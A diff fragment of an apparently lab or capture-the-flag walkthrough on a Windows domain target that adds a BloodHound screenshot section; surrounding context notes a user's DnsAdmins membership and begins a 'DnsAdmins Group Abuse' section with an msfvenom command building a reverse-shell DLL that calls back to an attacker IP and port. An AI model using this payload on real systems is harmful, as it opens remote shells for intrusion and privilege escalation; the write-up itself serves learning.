@@ -555,6 +555,12 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 During enumeration, I checked Ryan's Desktop directory and found `note.txt`. I wasn't sure what it meant, so I skipped it for the time being. I then reviewed the user's full information and discovered that Ryan is a member of the DnsAdmins group.
 
 ---
+## BloodHound
+
+<img width="1345" height="539" alt="image" src="https://github.com/user-attachments/assets/37e343b2-feda-407c-99b2-98aa9843417a" />
+
+
+---
 ## DnsAdmins Group Abuse
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.107 LPORT=443 -f dll -o rev.dll        
